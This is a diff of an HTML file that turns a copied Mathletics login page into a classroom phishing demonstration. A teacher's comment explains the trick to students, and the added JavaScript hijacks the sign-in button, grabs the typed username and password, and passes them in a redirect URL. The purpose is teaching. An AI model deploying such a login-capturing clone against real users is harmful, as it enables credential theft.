@@ -13,22 +13,52 @@
     <!-- The <title> value is used by default when adding an icon to the iOS homescreen -->
 
     <title>Mathletics</title>
+
+
+    <!--
+
+    Hi students of Tahi class!  Congratulations on viewing the source. If you want to learn about a web page, always look at the source.
+
+    This is an example of phishing. 
+
+    What we did here is copy the Mathletics login page HTML.
+    Then we added a little bit of Javascript.
+    The Javascript takes over the login button, so when you click on it, 
+    it sends the username and password to another page where you can see it.
+
+    That is to show how phishing works. But on a real phishing page, we would send the
+    username and password to some other place, and then send you on to the real Mathletics -
+    so you would never even know your password was stolen!
+
+    You have to be careful when using links people sent you.
+
+    Always look at the address bar and make sure the URL looks right.
+    In this example the URL is adrianparker.com - not Mathletics! That's a big clue something is not right.
+
+    -->
     <script type="text/javascript">
+    // this is the Javascript that does the phishing.  
     function hackLogin(){
-    	console.log('ready to hack');
+        //first we put the Mathletics logo in place.
     	var pageheader = document.getElementsByClassName("page-header")[0];
     	pageheader.innerHTML="<img src='0ee7e673d84778d7a7d9.svg'>";
+        // then we find the login button
     	var loginButton = document.getElementById("ppp-sign-in");
+        // and we change what it does when you click on it
     	loginButton.onclick =function(){
+            // lets grab what the user types in the password field
     		var password = document.getElementById("ppp-user-password");
+            // and what they typed in the user name field
 	    	var username = document.getElementById("ppp-username");
-    		console.log('oh oh '+password.value+' '+username.value); 
+            // here we redirect to a page where we show the students what we phished.
+            // but in a real Phising site, we would send the information someplace and then redirect to the real page, 
+            // so no one knew what had happened.
     		window.location='Hacked.html?a='+password.value+'&b='+username.value;
     		return false;
     	};
     	loginButton.setAttribute('ng-click','');
-    	
     };
+    // we wait two seconds after the page loads to add our phishing code on
     setTimeout(hackLogin, 2000);
     </script>
 
